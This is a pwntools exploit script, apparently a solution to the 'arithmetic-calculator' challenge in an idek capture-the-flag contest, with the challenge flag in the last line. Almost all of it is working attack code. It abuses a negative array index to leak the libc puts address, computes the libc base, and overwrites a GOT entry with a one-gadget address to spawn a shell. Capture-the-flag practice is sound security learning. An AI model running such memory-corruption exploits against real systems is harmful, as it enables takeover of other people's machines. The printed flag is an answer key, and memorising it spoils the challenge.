#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host arithmetic-calculator.chal.idek.team --port 1337 integer_calc
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('integer_calc')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or 'arithmetic-calculator.chal.idek.team'
port = int(args.PORT or 1337)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
b store
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      PIE enabled

r = start()

def read(r, idx) -> int:
    idx = int(idx)
    r.recvuntil(b'> ', drop=True)
    r.send(b'2\n')

    r.recvuntil(b'index:', drop=True)
    r.send((str(idx) + '\n').encode())

    r.recvuntil(b'index:', drop=True)
    r.send(('0' + '\n').encode())

    d = int(r.recvline().decode().split()[2])
    #print(f'read {d}')
    return d

def write(r, idx, val):
    r.sendline(b'0')
    r.sendline(str(idx))
    r.sendline(val)
    return

print(r.recvuntil(b'Welcome to my arithmetic calculator!'))

libc_puts_idx = ((0x00000000000040C0-0x0000000000004018)/8) * -1
puts = read(r, libc_puts_idx) 
print('Puts leak :    ', hex(puts))


libc_base = read(r, libc_puts_idx) - 0x0875a0
onegad = libc_base + 0xe6c81
print('libc_base:    ', hex(libc_base))
write(r, -21, str(onegad))

r.interactive()
#idek{GU355_1_n33d_t0_r34d_Ab0ut_51gness}
